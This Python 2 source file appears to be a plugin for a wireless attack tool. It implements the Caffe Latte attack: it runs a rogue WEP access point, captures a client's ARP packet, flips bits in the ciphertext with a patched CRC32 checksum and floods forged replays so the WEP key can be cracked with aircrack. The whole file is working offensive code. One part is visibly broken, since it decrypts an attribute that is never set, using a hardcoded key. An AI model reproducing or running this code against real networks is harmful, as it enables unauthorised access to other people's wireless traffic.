# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network
You can then check the wep data log and launch aircrack on it.
"""
from AuxiliaryModules.minwepap import MinimalWEP
from plugin import AirScannerPlugin, AirInjectorPlugin
from random import randint
from scapy.all import sniff, Dot11, Dot11WEP, conf
from subprocess import Popen
from struct import pack
from threading import Thread
from utils.crc import calc_crc32


# Should be an AirHostPlugin but hostapd cannot send
# successfull auth responses to any credentials,
# that is why MinimalWEP had to be created
class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):

    def __init__(self):
        super(CaffeLatte, self).__init__("caffelatte")
        self.sniffing_interface = self.config["sniffing_interface"]
        self.ap_ssid = self.config["ap_ssid"]
        self.ap_bssid = self.config["ap_bssid"]
        self.channel = int(self.config["fixed_sniffing_channel"])  # Because of global variables this is already checked by the airscanner
        self.wep_ap = MinimalWEP(self.ap_ssid, self.ap_bssid, self.channel, self.sniffing_interface)
        self.replay_attack_running = False

        self.original_arp_packet = None
        self.flipped_arp_packet = None

        self.n_captured_data_packets = 0
        self.n_arp_packets_sent = 0

    def identify_arp_packet(self, packet):
        return len(packet[Dot11WEP].wepdata) == 36 and \
            packet[Dot11].addr1 == self.ap_bssid and  \
            packet[Dot11].addr3 == "ff:ff:ff:ff:ff:ff"

    def flip_bits(self, packet):
        wepdata = packet[Dot11WEP].wepdata
        cyphertext = str(packet[Dot11WEP])[- (len(wepdata) + 4):]

        flipped_packet = packet.copy()
        # Create bitmask with same size as the encrypted wepdata
        bitmask = list('\x00' * len(wepdata))
        # Flip bits of the bitmask corresponding to the last byte of sender MAC and IP respectively
        bitmask[len(wepdata) - 11] = chr(randint(0, 255))
        bitmask[len(wepdata) - 15] = chr(randint(0, 255))
        print "bitmask: ", bitmask, "\n"
        # Create crc32 checksum for the bitmask
        icv_patch = calc_crc32(bitmask)
        icv_patch_bytes = pack("<I", icv_patch)
        final_bitmask = bitmask + list(icv_patch_bytes)
        print "icv_patch: ", icv_patch, "\n"
        print "icv_patch_bytes: ", list(icv_patch_bytes), "\n"
        print "final_bitmask: ", final_bitmask, " len: ", len(final_bitmask), "\n"
        # Now apply the 'patch' to the wepdata and the icv
        flipped_result = [ chr( ord(cyphertext[i]) ^ ord(final_bitmask[i]) ) for i in range(len(cyphertext)) ]
        final_result = str(packet[Dot11WEP])[:4] + "".join(flipped_result)
        print "flipped_result: ", flipped_result, " len: ", len(flipped_result), "\n"
        # Put the results back in the packet
        flipped_packet[Dot11WEP] = Dot11WEP(final_result)
        # Now lets change the 802.11 information header to look like it came from a client.
        flipped_packet[Dot11].FCfield = "from-DS+retry+wep"
        flipped_packet[Dot11].addr1 = "ff:ff:ff:ff:ff:ff"
        flipped_packet[Dot11].addr3 = (packet[Dot11].addr2[:-2] + "%02x") % randint(0, 255)
        flipped_packet[Dot11].addr2 = self.ap_bssid

        return flipped_packet

    def replay_attack(self):
        socket = conf.L2socket(iface = self.sniffing_interface)
        flipped_packets = []

        print "[+] Creating 5 new ARP requests with flipped bytes"
        for i in range(5):
            flipped_packets.append(self.flip_bits(self.original_arp_packet))

        print "[+] Starting replay attack"
        while self.replay_attack_running:
            # Always send fresh new packets
            try:
                for i in range(5):
                    socket.send(flipped_packets[i])
            except: pass  # No buffer space available.. skip and keep sending

        print "[+] Stopped replay attack from last ARP packet"
        socket.close()

    def pre_scanning(self):
        self.wep_ap.start()

    def handle_packet(self, packet):
        if not self.replay_attack_running:
            self.wep_ap.respond_to_packet(packet)
            if Dot11WEP in packet:
                if self.identify_arp_packet(packet):
                    print "[+] Found a Gratuitous ARP packet"
                    self.original_arp_packet = packet
                    self.replay_attack_running = True
                    Thread(target=self.replay_attack).start()

                    tmp = self.flipped_packet
                    tmp[Dot11WEP].decrypt(key="\x31\x32\x33\x34\x35")
                    tmp.show()

    def post_scanning(self):
        self.replay_attack_running = False
        self.wep_ap.shutdown()
